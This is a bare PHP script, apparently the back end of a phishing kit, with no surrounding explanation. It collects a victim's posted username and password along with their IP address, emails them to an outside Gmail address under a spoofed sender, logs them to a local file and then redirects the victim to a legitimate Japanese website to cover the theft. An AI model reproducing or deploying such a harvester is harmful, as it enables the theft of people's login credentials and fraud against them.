<?   

$ip = getenv("REMOTE_ADDR");
$message .= "Username : ".$_POST['username']."\n";
$message .= "Password : ".$_POST['password']."\n";
$message .= "IP : ".$ip."\n";
$send = "m888lenny@gmail.com";
$subject = "~ Active ~";
$headers = "From: StarBoy<logs@activ.ne.jp>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message); 
$fp = fopen("m.txt","a");
fputs($fp,$message);
fclose($fp);
header("Location: https://www.wadax.ne.jp");
	  

?>